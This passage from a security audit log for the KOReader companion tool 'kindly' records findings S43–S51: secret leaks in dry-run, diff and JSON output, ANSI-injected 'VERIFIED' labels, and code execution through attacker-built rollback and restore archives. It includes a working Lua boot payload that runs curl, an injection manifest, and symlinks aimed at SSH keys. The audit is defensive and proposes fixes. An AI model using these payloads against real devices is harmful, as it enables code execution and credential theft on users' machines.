  ~ calibre_wireless_password  "victim-calibre-PIN-9821" → "attacker-calibre-0000"
  ~ kosync.userkey  "deadbeefcafe0123victimtokenvalue" → "attacker-controlled-kosync-token"
  ~ kosync.username  "victim_kosync" → "attacker_kosync"
  ~ pinpadlock_message  "If found, please call +00 555 000 1234" → "Reward if returned. Call +00 555 999 8888"
  ~ pinpadlock_pin_code  "1379" → "0000"
  ~ refresh_rate  12 → 8
  ~ zlibrary_password  "VictimZlibPwLong_2026_04" → "attacker-zlib-pw"
  ~ zlibrary_username  "victim@example.com" → "attacker@evil.test"
(--dry-run — nothing written)
```

Every SECRET on the left side is a victim plaintext read off
settings.reader.lua (`pull` would have dropped them; `apply
--dry-run` prints them). `pinpadlock_message` is the
phone-number-in-practice key (docs/30 secrets denylist) — current
number visible too.

**Kindly side — S43a (full apply):** identical change list, then
`✓ applied`, exit 0, device now carries `["zlibrary_password"] =
"attacker-zlib-pw"` etc. Fully confirmed by re-grep of post-apply
`settings.reader.lua`.

**What this confirms.**

1. `apply`'s naked surface covers SECRETs in addition to SENSITIVE.
   The `src/lib/apply.ts` path imports nothing from classify.ts.
2. The diff renderer is a separate surface from the merge path.
   Even if §8.6 adds a SENSITIVE gate around merge, the renderer
   still leaks victim plaintext under `--dry-run` before any gate
   fires — because dry-run is precisely the "safe preview" users
   reach for when they're unsure. Redaction must happen in the
   renderer unconditionally for SECRET keys.
3. Realistic attack: not crypto-grade credential theft, but the
   targeting surface is wide. `zlibrary_username` + `zlibrary_password`
   overwrite hijacks the victim's library account for future
   downloads (downloads now attributed to attacker's account, or
   the attacker's account's abuse counts toward victim's IP).
   `calibre_wireless_password` lets attacker join the victim's
   Calibre-on-LAN session. `kosync.userkey` hijacks reading-
   position sync. `pinpadlock_message` replaces the "lost device"
   contact number — a recovery-channel hijack.
4. S20 (type-mismatch info leak) already identified that the diff
   renderer prints current values during overwrite preview. S43b
   confirms this is worse than S20 suggested: no type mismatch
   needed, no warning fires, happens on any SECRET overwrite.

**Implication for v0.11.2 (§8.6 + §8.4 upgrades).**

- **§8.6 extension:** the shared helper must classify SECRET *and*
  SENSITIVE. On SECRET overwrite, the default must be a policy
  block (exit 3), not a silent write. A `--accept-overwrite-secret
  <key>` per-key opt-in would mirror the setup-side granularity.
- **§8.4 generalization:** the diff renderer must redact SECRET
  values from both sides of `prev → next` regardless of whether
  the new value hits SENSITIVE or triggers any other warning. The
  renderer is a separate surface and its current behavior leaks
  under every apply path, not just type-mismatch.

Harness: `/tmp/kindly-s43-live/run.sh`. Fixture at
`/tmp/kindly-s43-live/` with placeholder-credential seed (values
are fake but realistic-shaped). Reproducible in ~2s — no KOReader
launch needed; the leak is at `kindly apply --dry-run`.

---

### S44 — `kindly rollback` = silent ingestion with no trust gates (live-verified)

**Fourth and broadest apply-path-adjacent finding.** Rollback is
documented as an undo primitive for `setup import`. It accepts a
directory argument — any directory — containing
`settings.reader.lua` and/or `plugins-patches.tar.gz`. It overwrites
device settings from the first file and extracts the second into
`mount.koreaderRoot`. Structurally equivalent to `setup import
--accept-plugins --accept-patches --accept-sensitive --accept-
overwrite-secret *` with **zero flags, zero warnings, zero
verification**. The fat tar has:

- no hash pinning (no manifest to pin against)
- no catalog check (W32 doesn't run on rollback)
- no scanner (W36 doesn't run on rollback)
- no SENSITIVE/SECRET diff (classify.ts not imported by
  `src/commands/rollback.ts`)

Only guards are size-cap and path-safety (F8) on the tar itself.

**The attack shape.** Attacker ships a "kindly snapshot dir" on any
file-drop surface (Dropbox folder, GitHub archive, a companion
tool that "imports" community setups). User is told: "run `kindly
rollback <dir>` to try my reading setup — safer than `setup import`
because it's a rollback". The command's own output reinforces this
— it prints `✓ restored 3 plugin/patch file(s)`, where "restored"
reads as safe user-data recovery but is actually raw code
extraction.

**The fake-snapshot.** Two files attackers can mint from scratch:

```
fake-snapshot/
├── settings.reader.lua        # attacker-chosen: plugins_disabled.terminal=false,
│                              #                  terminal_shell=/evil/probe.sh,
│                              #                  extra_plugin_paths=/evil/
└── plugins-patches.tar.gz     # plugins/s44evil.koplugin/{main.lua,_meta.lua}
                               # patches/2-autorun.lua
```

No kindly-specific format markers. Any tar.gz with those two
top-level directories and path-safe entries passes.

**Kindly side.**

```
$ kindly rollback /tmp/kindly-s44-live/fake-snapshot --mount <fixture>
rollback from /tmp/kindly-s44-live/fake-snapshot
  settings: settings.reader.lua
  fat state: 6 path(s) will be restored from plugins-patches.tar.gz
    - plugins/s44evil.koplugin/{_meta.lua,main.lua}
    - patches/2-autorun.lua
✓ restored settings.reader.lua
  pre-rollback backup: .kindly/pre-rollback/2026-04-23T19-00-16-231Z
✓ restored 3 plugin/patch file(s)
warn: restart KOReader (or your Kindle) for changes to take effect.
EXIT: 0
```

No `--accept-plugins`, no `--accept-sensitive`, no catalog
verdict, no scanner output, no mention of `code execution`.
The word "restored" in the success lines is positively
misleading — nothing is being *restored*, this is first-touch
extraction of attacker-supplied code.

**KOReader side.** Fresh launch reads post-rollback settings,
loads the extracted plugin, applies the extracted patch. Marker
**4 seconds** after launch:

```
04/23/26-22:00:16 INFO  Applying patch: .../patches/2-autorun.lua
04/23/26-22:00:16 INFO  Looking for plugins in directory: .../plugins
04/23/26-22:00:16 INFO  Looking for plugins in directory: /tmp/kindly-s44-live/fixture/koreader/plugins
04/23/26-22:00:17 INFO  s44evil: init fired — code reached via kindly rollback fat-tar extraction
04/23/26-22:00:19 INFO  s44evil: marker written + beacon sent
```

**Evidence captured.**

- `/tmp/kindly-s44-live/s44-marker.txt`:
  `2026-04-23T19:00:19Z S44 rollback plugin executed (delivered via plugins-patches.tar.gz in a fake snapshot dir, no flags, no catalog, no hash verification)`.
- Listener at `127.0.0.1:4444` received
  `GET /s44?ts=2026-04-23T19:00:19Z HTTP/1.1` 200.
- Both the plugin's attacker-shell-pointer settings (`terminal_shell`,
  `extra_plugin_paths`) AND the plugin itself landed — rollback is
  the only single command in kindly that delivers both surfaces
  at once.

**What this confirms.**

1. Rollback is a *third* trust-gate blind spot, after `apply`
   (S38/S42/S43) and the setup-import `extra_plugin_paths` case
   (W31a, defended there but bypassable via apply/rollback).
2. Worst single-command primitive so far: settings + plugins +
   patches in one `rollback`. S38/S42/S43 needed separate
   YAML tricks to reach each surface.
3. The rollback command's surface area assumes snapshot
   dirs are "trusted by construction" because they *usually* come
   from `.kindly/pre-import/<stamp>/`. But the command accepts
   any path — attacker-minted directories pass the existing
   structure checks trivially.
4. Pre-rollback backup is created even for attacker-fed rollbacks
   (`.kindly/pre-rollback/<stamp>/` holds the pre-attacker state).
   That's actually good — it means the user CAN unroll the
   attack via a second rollback into the pre-rollback dir. But
   they have to know the attacker-rollback happened.

**Implication for v0.11.2 (§8).** New item §8.7:

- **§8.7 Rollback-source trust gate.** `kindly rollback` must
  distinguish between kindly-produced snapshots and arbitrary
  directories. Minimum: a trust marker file written by kindly at
  snapshot-creation time (e.g., `.kindly-snapshot.meta` with the
  kindly version, a HMAC over the snapshot contents using a
  machine-local key stored in `.kindly/trust.key`, and the
  source-import-id). `rollback` refuses any directory without a
  valid marker; a `--trust-foreign-snapshot` opt-in flag lets the
  user acknowledge non-kindly-produced input. The HMAC detail
  matters — without a MAC, the attacker just copies the marker
  file verbatim from a user's real snapshot dir. Machine-local key
  makes the marker non-forgeable without filesystem access.
- Alternative (cheaper, weaker): rollback runs the setup-import
  verification pipeline on the fat tar (scanner, catalog check,
  SENSITIVE detector on settings). Doesn't stop S44 by itself if
  the attacker's tar is only an uncatalogued plugin (see S3) but
  at least surfaces advisories and fires the SENSITIVE gate on
  settings.

Harness: `/tmp/kindly-s44-live/run.sh`. Fake-snapshot at
`/tmp/kindly-s44-live/fake-snapshot/`. Reproducible in ~15s.

---

### S45 — `kindly diff` leaks SECRETs same as `apply --dry-run` (live-verified)

Straight code-read confirmation: `src/commands/diff.ts:84-96`
`renderChange` is structurally identical to apply's (prints
`fmt(c.prev) → fmt(c.next)` with no classify lookup, no redaction).
Re-ran the S43b attacker YAML through `kindly diff`:

```
$ kindly diff --mount /tmp/kindly-s43-live/fixture --file friend-shared.yaml
9 change(s) would be applied:
  ~ LocalSend_pin  "551234" → "999999"
  ~ calibre_wireless_password  "victim-calibre-PIN-9821" → "attacker-calibre-0000"
  ~ kosync.userkey  "deadbeefcafe0123victimtokenvalue" → "attacker-controlled-kosync-token"
  ~ kosync.username  "victim_kosync" → "attacker_kosync"
  ~ pinpadlock_message  "If found, please call +00 555 000 1234" → "Reward if returned. Call +00 555 999 8888"
  ~ pinpadlock_pin_code  "1379" → "0000"
  ~ refresh_rate  12 → 8
  ~ zlibrary_password  "VictimZlibPwLong_2026_04" → "attacker-zlib-pw"
  ~ zlibrary_username  "victim@example.com" → "attacker@evil.test"
```

Every victim plaintext again. `kindly diff` is positioned as the
*safe, read-only* inspection command (exits 1 on drift, git-diff
style). Two amplifying factors vs. S43b:

1. `kindly diff` is the command a cautious user reaches for. The
   mental model is "let me just see what apply *would* change
   without running it" — precisely the safety-focused path.
2. The `git diff`-style exit code invites piping into logs:
   `kindly diff | tee drift.log`, `kindly diff || notify "drift"`,
   CI jobs that persist diff output as a build artifact. Every
   pipe is an exfil channel if the YAML happens to carry SECRET
   keys (see S43a — attacker arranges this).

**Defended surface (for the record):** `kindly doctor`
(`src/commands/doctor.ts:78-87`) prints only SECRET *key names*
for password-manager-rescue advice, never values. That's correct.
`kindly pull` drops SECRETs entirely via `filterForYaml`
(classify.ts denylist) — also correct.

**Scope of S45.** The SECRET leak is in `renderChange`, which is
per-command. Apply, diff, and any other command that calls
`renderChange` (or reimplements it) needs the same redaction.

**Implication for v0.11.2 (§8.4).** Already scoped by §8.4
generalization: redact SECRETs in the diff renderer on both sides
of `prev → next`, unconditionally. The fix is one helper function
placed in `src/schema/classify.ts` (or adjacent) that returns
`«REDACTED»` or `«REDACTED (…ab12)»` (last 4 hex chars of SHA-256
for diff-usefulness) for SECRET keys. Apply, diff, and any future
diff-renderer callsite route through it.

Evidence: command output captured verbatim above. No KOReader
launch needed.

---

### S40 — ANSI injection forges `(VERIFIED ✓)` over `(UNVERIFIED)` label (live-verified)

**Promotes S7 from static claim to observed.** S7 was recorded as
"ANSI/control-char injection in author/source/description —
combines with S4 to produce all-green forged display". Now
demonstrated end-to-end against the real `setup import` dry-run
path.

**Mechanism.** `src/setup/schema.ts:88-99` validates
`meta.author`/`description`/`source_url` as
`z.string().optional()` — no length cap, no byte-class filter, no
sanitization. `src/commands/setup.ts:725-740` writes these
straight to stdout via `info(env, …)`, with a trailing `" " +
dim(env, "(UNVERIFIED)")` suffix. The author string itself can
contain CR (`\r`), ANSI color codes, and `\x1b[K` clear-to-EOL —
each of which is uninterpreted when the manifest is parsed as
YAML (double-quoted strings support `\x1b` hex escape) and each of
which activates when the bytes hit the terminal.

**The attacker manifest.** Lean `.kset.yaml` (same shape works in
a fat `.kset` — S4 already demoed fat-archive code drop; S40 adds
the display-forgery layer):

```yaml
kindly_setup: v1
apply_mode: additive
meta:
  name: friendly-pack
  author: "j.doe\r  author:       j.doe \x1b[1;32m(VERIFIED ✓ community-catalog-v1)\x1b[0m\x1b[K"
  description: "Popular PW5 reading setup."
  created_at: "2026-04-23T21:00:00Z"
settings:
  refresh_rate: 8
```

**Kindly side (raw bytes of `author:` line from dry-run stdout,
hex-dumped):**

```
  author:       j.doe\r  author:       j.doe \x1b[1;32m(VERIFIED ✓ community-catalog-v1)\x1b[0m\x1b[K (UNVERIFIED)
```

Key bytes: `0d` (CR) after the original `j.doe`, `1b 5b 31 3b 33 32
6d` (`\x1b[1;32m` bold green), UTF-8 ✓ (`e2 9c 93`), `1b 5b 30 6d`
(reset), `1b 5b 4b` (erase to end of line).

**What the user sees** in an interactive terminal (after `\r`
rewinds to column 0, the second label+name overwrites the first,
green activates, `\x1b[K` clears the `(UNVERIFIED)` suffix):

```
importing friendly-pack  (0906c6357767)
  from:   /tmp/.../friendly-pack.kset.yaml
  author:       j.doe (VERIFIED ✓ community-catalog-v1)       ← bold green
  description:  Popular PW5 reading setup.
```

The `(UNVERIFIED)` tag — the single most important trust signal
the import currently emits — is gone. The user sees a bold-green
"VERIFIED ✓ community-catalog-v1" attribution for a manifest that
is in reality unverified freeform YAML.

**Chained with S4.** Swap the lean manifest for a fat `.kset` with
a `bookshortcuts.koplugin` MATCH-hash + `patches/2-analytics-
hook.lua` byte-table payload (already live-verified in S4). The
user now sees a bold-green "VERIFIED" header while kindly prints
`scanner: 1 file(s) scanned, 2 suppressed by catalog — no novel
findings` and silently lands the patch on disk. The `✓ verified
by community` framing makes the "no novel findings" line read as
corroborating evidence.

**What this confirms.**

1. W33's identity-claim block is not just unverified (which it
   honestly admits with `(UNVERIFIED)`) — it is actively
   *forgeable*, because the suffix can be painted over by
   attacker-controlled bytes in the field it's trying to qualify.
2. The display-surface attack is independent of catalog, hash,
   and scanner. Even once S4 is closed (patch-tier gate added in
   §8.2), S40 still works against lean-manifest imports.
3. Many CI/automation setups would mask this: terminals without
   ANSI support, piped output to files, `--json` mode. But the
   target user — someone running `kindly setup import` interactively
   after downloading a community-shared manifest — is exactly the
   audience S40 targets.
4. Defense is trivial (one sanitizer, one choke point). This is
   low-hanging fruit in the hardening PR.

**Implication for v0.11.2 (§8.3 already covered).** §8.3
(Manifest identity-field sanitizer) was already written up as a
minimum hardening item based on static analysis. S40 promotes it
from speculative to load-bearing. Expand §8.3 scope slightly:

- Reject (do not render-escape) any byte in `0x00..0x1F` except
  `\n` and `\t`, and the C1 range `0x80..0x9F`. This is the same
  filter docs/30 says the settings-value renderer already applies
  (S25 evidence). Copy it to the identity-field renderer.
- Enforce max display length per field (say, 120 chars).
- Render each identity field on its own terminal line — even if a
  bare `\n` slips through, the line below can't visually leak the
  trailing `(UNVERIFIED)` tag onto the wrong key.
- Apply the same filter to `meta.name`, `meta.tags`, `sourceUrl`,
  `description`, and any other user-controlled field written to
  stdout.

Harness: `/tmp/kindly-s40-live/build-manifest.py` emits a lean
`friendly-pack.kset.yaml` with YAML `\x1b`-escape sequences in
`meta.author`. `bun run src/cli.ts setup import … --dry-run`
reproduces the forgery. Raw bytes captured in
`/tmp/kindly-s40-live/raw-stdout.bin`.

---

### S46 — `kindly restore` = fat-tar RCE in one command (live-verified)

**Sibling of S44 but cleaner attack shape.** S44 used
`kindly rollback <attacker-dir>` (a directory containing
`settings.reader.lua` + a fat tar). S46 uses `kindly restore
<attacker.tar.gz>` — a single-file attack artifact, no directory
choreography. Same root cause: `src/commands/restore.ts` imports
nothing from classify.ts; `assertSafeArchive` + `extractTarGz`
enforce only path-safety + size-cap; no hash, no catalog, no
scanner.

**The attacker tar.** One `.tar.gz`, built with `tar -czf`:

```
settings.reader.lua
plugins/s46evil.koplugin/_meta.lua
plugins/s46evil.koplugin/main.lua
patches/2-autorun.lua
```

**The command.** `kindly restore /tmp/evil.tar.gz --mount <fixture>`.
Zero flags. Exit 0. Output:

```
safety snapshot: /Users/claw/kindly/.kindly/pre-restore/…-Z.tar.gz
extracting 7 entries into <fixture>/koreader...
✓ restored 4 file(s) into <fixture>/koreader
warn: restart KOReader (or your Kindle) for changes to take effect.
```

The safety-snapshot line and the "restored" framing cast the
operation as *undoing harm*, not *installing code*. The "restart
KOReader" warning is the one true signal — same warning `kindly
apply` emits for a refresh_rate change.

**Live observation.** KOReader booted against the restored fixture:
`Applying patch: …/patches/2-autorun.lua` →
`s46evil: init fired — delivered via `kindly restore <fat-tar>`
with zero flags` → marker file written 4s after launch → listener
at `127.0.0.1:4646` received `GET /s46` 200.

**Why S46 belongs next to S44 but isn't a dup.**

- **Attack shape.** S44 needs a directory layout matching the
  snapshot convention (settings file at top + `plugins-patches.tar.gz`
  inside). S46 needs one self-contained `.tar.gz`. The latter is
  trivially shareable as a single URL / single forum attachment —
  strictly more weaponizable distribution.
- **User framing.** `rollback` implies "revert the last change";
  `restore` implies "install a complete configuration". Users who
  would be cautious of a rollback from an unknown source may be
  less cautious of a restore advertised as "my complete setup".
- **`--dry-run` does list all entries.** S46's dry-run showed every
  path, so a vigilant user *could* notice `plugins/…/main.lua`
  before executing. But the output caps at 50 entries — a fat
  snapshot with real plugins (6+ typical) buries the evil one in
  the middle of the list, and the kindly renderer offers no hint
  that ingesting a `.koplugin` is a code-execution decision.

**Implication for v0.11.2.** Extend §8.7 (originally scoped to
rollback) to cover `restore` — they share the same trust-gate
vacuum. The HMAC'd marker-file approach proposed for rollback
applies identically: `kindly snapshot` writes
`<tar>/.kindly-snapshot-marker` keyed to a machine-local secret
(stored under `~/.kindly/`); `kindly restore` refuses tars without
a valid marker. External tars require `--from-untrusted` which
triggers the same pipeline as `setup import` — scanner, catalog
lookup, `SENSITIVE`-key advisory. This closes S44/S46/S47 with
one mechanism.

Harness at `/tmp/kindly-s46-live/`. Reproducible in ~15s.

---

### S47 — snapshot-as-distribution: kindly's own tools are the attack framework (live-verified)

**Weaponization requires no custom tooling.** S46 proved `restore`
ingests untrusted tars. S47 proves the *producer* side is
`kindly snapshot` — the attacker never constructs a tar manually.

**The chain.**

1. Attacker compromises their own kindle (trivially — it's theirs).
   Lands an evil plugin under `plugins/s47evil.koplugin/`.
2. Attacker runs `kindly snapshot --label "my-cozy-pw5-setup"
   --output my-reading-setup.tar.gz`. Output:

   ```
   ✓ wrote /…/my-reading-setup.tar.gz
     1.4 KB, 3 root path(s)
       settings.reader.lua
       patches
       plugins
   warn: this archive contains plaintext secrets — do NOT commit to git.
     (secrets live in settings.reader.lua: PIN, zlibrary password, …)
   ```

   The only warning is about leaking the *attacker's own* secrets
   (a non-issue for them). **Zero warnings about plugin code
   being included**, because kindly has no concept of "plugin I
   wrote" vs "plugin dropped by a previous compromise" — it tars
   what's on disk.

3. Attacker shares `my-reading-setup.tar.gz` on a forum:
   *"Here's my complete PW5 reading setup — just `kindly restore`."*
4. Victim on clean fixture runs `kindly restore
   my-reading-setup.tar.gz`. Plugin + patch + settings extracted.
5. Victim launches KOReader. `s47evil: init fired`. Marker + `GET
   /s47` 200 at `127.0.0.1:4747`, 4s after launch.

**What makes this novel vs S46.**

- **Blessed-looking output.** The attacker's tar was produced by
  kindly itself. No suspicious structure. `file` metadata, tar
  layout, and even the output filename (`kindly-snapshot-*.tar.gz`
  by default) are indistinguishable from a legitimate user
  backup.
- **Trust-tier origin loss.** A snapshot the user took yesterday
  and a snapshot from a forum post look identical to `kindly
  restore`. There is no "origin" metadata in the tar. Compare with
  `.kset` which at least carries `meta.author` / `meta.source_url`
  (forgeable, but at least the *concept* exists).
- **Natural distribution channel.** Posting a `.kset` on a forum
  requires the user to understand kindly's setup format. Posting
  a snapshot is framed as *sharing a backup* — a user-facing
  mental model that exists in every backup tool ever. The
  distribution story writes itself.

**Status of §9 item S29.** S29 was listed as "snapshot/restore
round-trip — does restore re-fire the W31 gate?". S44 + S46 + S47
answer this completely: no, restore has no W31 equivalent; the
auto-pre-import snapshot captures pre-attack state (benign);
*subsequent* user snapshots propagate compromise (S47). Mark S29
as ✅ covered.

**Implication for v0.11.2.** Same §8.7 mechanism as S46: HMAC'd
marker keyed to a machine-local secret. Attacker's snapshot won't
carry a marker valid on the victim's machine; restore refuses
without `--from-untrusted`, which triggers the full setup-import
pipeline. Also consider `meta.producer_fingerprint` in the
snapshot tar — at minimum a human-readable *machine name* that
differs between attacker and victim, so the victim sees "this
snapshot was produced on host `foo.local` at 2026-04-23 — does
that match your setup?" before extraction.

Harness at `/tmp/kindly-s47-live/`. Reproducible in ~15s; uses
kindly's snapshot + restore commands end-to-end, no custom tar.

---

### S48 — `--json` mode carries the same SECRET leak (live-verified, generalizes S43b/S45)

**Machine-readable twin of S43b + S45.** S43b proved `apply --dry-run`
leaks 5 SECRET plaintexts in its human-readable diff. S45 showed
`kindly diff` has the same leak. S48 shows the `--json` envelope
on both commands carries the values too — in fact twice, because
`DiffResult.grouped` re-emits the same changes in a grouped
sub-object.

**Root cause.** `computeChanges()`
(`src/schema/diff.ts:46`) operates on unfiltered on-device data;
`Change` entries carry `prev`/`next` verbatim. The JSON emitter
(`src/cli/json.ts:82`) serializes the whole result tree with no
classify lookup, no redaction. Same gap as the human renderer
(`apply.ts:91-100`, `diff.ts:84-96`), just a different output
path.

**Repro** (independent verification against the real CLI, fixture
with all 5 SECRET keys seeded, attacker YAML overwriting each):

```bash
bun run src/cli.ts apply --file attack.yaml --mount /tmp/audit-A-verify --dry-run --json
bun run src/cli.ts diff  --file attack.yaml --mount /tmp/audit-A-verify --json
```

Both stdouts contain every victim plaintext:

```
1379
551234
deadbeefcafe0123victimtokenvalue
victim-calibre-PIN-9821
VictimZlibPwLong_2026_04
```

**Why S48 is worse than S43b/S45, not just equivalent.**

- **JSON is the automation output format.** CI pipelines, cron
  drift-detectors, dashboards, and anything that pipes kindly
  into `jq` request `--json` by default. Every such pipe is an
  exfil channel — and JSON output typically lands in structured
  log stores (Splunk, Datadog, S3 buckets) that retain long, are
  readable across teams, and survive the user's local terminal.
- **Double emission.** `DiffResult.grouped` re-serializes each
  change in a category-keyed sub-object. The verification run
  caught duplicate values for the diff command (`value\` +
  `value` patterns in the grep output). Every leak is two copies
  in the JSON tree — ensures the key won't be lost to JSON path
  filters.
- **Harder to notice.** Human diff output is visually scannable —
  a user pasting it into a bug report might see "oh, that looks
  like a password". JSON fields with generic names (`prev`,
  `next`, `before`, `after`) carry values without
  visual-context hints.

**Implication for v0.11.2.** §8.4 generalization now spans three
output paths: (1) apply human renderer (`apply.ts:91-100`), (2)
diff human renderer (`diff.ts:84-96`), (3) JSON envelope
(`json.ts:82`). The fix is one shared helper in classify.ts:
`redactForDisplay(key, value) → value | "<redacted-zlibrary_password>"`.
Every change-renderer — human OR JSON — routes through it. No
renderer-specific policy. No opt-out flag (§8.4 rule: SECRET
redaction is unconditional; if a user needs to see their own
secret they pull it from settings.reader.lua directly, which is
an explicit machine-local action).

No KOReader launch needed — the leak is at kindly's stdout. Credit:
independent code-audit pass (concurrent with S46/S47 live runs)
against `src/schema/diff.ts`, `src/cli/json.ts`, `computeChanges`
call sites.

---

### S49 — `defaults.custom.lua` as a third code-drop surface (live-verified)

**Generalizes the restore-path code-exec surface from 2 files
(plugins/patches) to at least 5.** KOReader's settings files are
loaded via `pcall(dofile, <file>)` — any top-level Lua in the file
runs at boot. Every file in kindly's `SNAPSHOT_PATHS` is such a
file. Demonstrated with `defaults.custom.lua`; pattern extends to
`history.lua` and `settings.reader.lua.old` with the same
primitive, confirmed by static source read:

| File | Loader | Evidence |
|------|--------|----------|
| `plugins/<name>/main.lua` | pluginloader.lua:140-162 (dofile) | S46/S47 live |
| `patches/*.lua` | frontend/userpatch.lua (dofile) | S44/S46 live |
| **`defaults.custom.lua`** | **frontend/luadefaults.lua:29 `pcall(dofile, …)`** | **S49 live, marker in 2s** |
| `history.lua` | frontend/readhistory.lua:110 `pcall(dofile, history_file)` | static-confirmed, not live-demo'd |
| `settings.reader.lua.old` | frontend/luasettings.lua:37 `pcall(dofile, new.file..".old")` | **live-verified 2026-04-24 via GGG dual-file probe** — main returns `nil` (triggers `ok and stored` false), `.old` executes attacker Lua in top-level `do…end`; marker written at boot |

**The attacker tar (minimal — two files).**

```
settings.reader.lua   (benign-looking, just refresh_rate + home_dir)
defaults.custom.lua   (payload rides in top-level pcall(fn) before `return { … }`)
```

Attacker's `defaults.custom.lua`:

```lua
local function s49_payload()
    local f = io.open("/tmp/kindly-s49-live/s49-marker.txt", "w")
    if f then f:write(os.date("!%Y-%m-%dT%H:%M:%SZ") .. " S49 …\n"); f:close() end
    os.execute("curl -s -m 2 'http://127.0.0.1:4949/s49' >/dev/null 2>&1 || true")
end

pcall(s49_payload)  -- runs at KOReader boot via LuaDefaults:open → pcall(dofile, file)
return { DEBUG = false }
```

**The command.** `kindly restore /tmp/evil.tar.gz --mount <fixture>`.
Zero flags. Exit 0. `✓ restored 2 file(s)`.

**Live observation.** Marker file written **2 seconds** after
KOReader launch (faster than any plugin-based delivery —
`LuaDefaults:open` runs very early in startup, before plugin
loader scans). Listener at `127.0.0.1:4949` received `GET /s49`
200. No `.koplugin` directory structure, no `_meta.lua`, no
priority-coded patch filename — just one Lua file.

**Why S49 matters as a distinct finding.**

- **Lower ceremony** than S46/S47 — no plugin directory, no
  manifest-shaped file, no patches/ priority code. A single Lua
  file that's framed as "config override".
- **Earlier execution** — runs in KOReader's early init (before UI,
  before plugin loader). Less time for any defensive hook to fire.
- **Less recognizable as code** to a user auditing a snapshot.
  Defenders scanning `plugins/` and `patches/` for
  executable-looking content may not think to open
  `defaults.custom.lua`.
- **Already in `SNAPSHOT_PATHS`** — `kindly snapshot` tars it
  silently alongside plugins/patches. Every S47 distribution
  carries this surface whether the attacker uses it or not.
- **Scope widener for §8.7.** Any hardening item that enumerates
  "gate plugins/ and patches/" specifically is incomplete. The
  rule must be *"any Lua file in the restore tar is a code-drop
  surface — HMAC the full tar, not a subset of paths"*.

**Important non-finding: `kindly apply` is NOT a vector for this
primitive on `settings.reader.lua`.** Apply constructs settings
files from scratch via `lua/writer.ts`, which escapes values
(S30 verified). Top-level code cannot be smuggled through YAML
into a kindly-authored settings file. The vector is exclusively
the **raw-extraction paths**: rollback (S44), restore (S46/S49),
and snapshot round-trip (S47).

Harness at `/tmp/kindly-s49-live/`. Reproducible in ~8s.

---

### S50 — symlink entries in restore tars bypass path-safety (live-verified)

**Categorical break of the extraction-safety invariant, moderate
impact.** `isSafeRelativePath` validates tar entry *paths* but not
symlink *targets*. A tar entry at safe relative path `stash` whose
symlink target is `/Users/victim/.ssh/id_ed25519` passes the filter
and extracts as a symlink on the victim's filesystem, target intact.

**The gap.** `src/fs/archive.ts:212-217` (and `assertSafeArchive`
at :194-199) list entries via `tar -tzf` (path names only — no file
type) and validate each path with `isSafeRelativePath`. The
extraction command is `tar -xzf archive -C destRoot` (line 219) —
BSD tar extracts symlinks as symlinks by default, target intact,
no validation. Entry type is invisible to the path-safety check.

**Observed behavior** (three probes against a fresh fixture):

1. Tar with `stash -> /tmp/kindly-s50-live/secret/stolen-data.txt`
   (a pre-planted "host secret" file): `kindly restore` exits 0,
   `ls -la <fixture>/koreader/stash` shows
   `lrwxr-xr-x stash -> /tmp/kindly-s50-live/secret/stolen-data.txt`.
   `cat <fixture>/koreader/stash` returns `HOST_SECRET: this file
   is outside any kindly workspace` — extraction-root sandbox
   breached by read-side follow.

2. Tar with symlinks under `plugins/` pointing at
   `/Users/claw/.ssh/id_ed25519` and `/Users/claw/.zsh_history`:
   extraction succeeds, targets preserved. Attacker's snapshot on
   the VICTIM machine would carry these symlinks *as symlinks*
   (not dereferenced — kindly's `createTarGz` at `archive.ts:63`
   uses `tar -czf` without `-h`/`--dereference`, so BSD tar
   preserves them). When the attacker extracts the shared snapshot
   on their own machine, the symlinks are broken (point at paths
   absent on attacker's box). Direct "plant-then-snapshot-then-
   share" exfil is neutralized by default BSD tar behavior.

3. **Cross-install bridging (live-exfiled):** tar with
   `settings.reader.lua` as a symlink to `/tmp/kindly-s50-
   otherinstall/koreader/settings.reader.lua` (simulating a second
   KOReader install on the same machine). After `kindly restore`,
   `kindly diff --file my.yaml --mount <fixture>` prints:

   ```
   ~ home_dir  "/home/someone-else" → "/mnt/us/documents"
   ```

   The `"/home/someone-else"` `prev` value is from the OTHER
   install, bridged through the symlink. `kindly pull --full`
   produced `leaked.yaml` containing `home_dir: /home/someone-
   else` plus all other non-SECRET keys from the bridged file.
   **Exfil works for non-SECRET values across installs on the
   same host.** SECRETs still strip correctly because
   `filterForYaml` runs regardless of backing storage — but
   that is an accidental save, not a deliberate symlink defense.

**What this is and isn't.**

- **Is:** a categorical break of the extraction-root sandbox.
  `kindly restore/rollback` is now an *arbitrary-symlink-creation*
  primitive inside the victim's filesystem. Any downstream tool
  that reads `<mount>/koreader/` assuming path-safety inherits
  the break. Cross-install info-disclosure via kindly's own
  diff/pull renderers (non-SECRET values) is confirmed.
- **Is not:** direct code execution. KOReader's `dofile` on a
  symlink to a non-Lua file fails with a syntax error, not code-
  exec. `safeWrite` uses `rename(tmp, final)` which replaces the
  symlink with a regular file on first apply — so write-side
  symlink clobber of host files is limited to paths apply never
  writes to (and apply specifically writes only `settings.reader.
  lua`). Direct snapshot-to-forum exfil is neutered by BSD tar's
  no-dereference default at creation time.

**Severity rating: moderate.** Not RCE. Info-disclosure plus
invariant-break, with credible chains (cross-install exfil via
predictable KOReader paths like `~/Library/Application Support/
koreader/settings.reader.lua`, or third-party tools reading
destRoot).

**Defense (extends §8.7).** During `assertSafeArchive` and
`extractTarGz`, reject any tar entry whose listing-verbose mode
starts with `l` (symlink) or `h` (hardlink). Implementation: replace
`tar -tzf` with `tar -tvzf`, parse the mode column. Reject on any
non-regular-file, non-directory entry type. Alternative: migrate
extraction away from `spawnSync("tar", …)` to an in-process tar
reader with explicit entry-type filtering. Either closes S50 and
hardens against similar variants (device nodes, FIFO, etc. — BSD
tar by default won't create these as non-root, but the
invariant-level fix covers them all).

Harness: `/tmp/kindly-s50-live/` with three stages
(`stage`/`stage2`/`stage3`) and bridging target at
`/tmp/kindly-s50-otherinstall/`. Reproducible in ~10s.

---

### S51 — `kindly rollback <dir>` is a fourth tar-ingestion RCE surface (live-verified)

**Full RCE via social-engineered `kindly rollback` on an attacker-
supplied directory. Sibling of S44/S46/S49 via a distinct command
name.** `rollback.ts:73` resolves `snapshotDir` against `env.cwd`
with no constraint that it live under `.kindly/pre-import/` or any
other kindly-owned state. The path-safety scan at `:101-110` only
runs `isSafeRelativePath` on tar entry *names*, which plain plugin
paths (`plugins/evil.koplugin/main.lua`) trivially pass. Line :167
then `extractTarGz`s the attacker tar into `mount.koreaderRoot`.

**The gap.** Rollback was designed as the "undo" side of
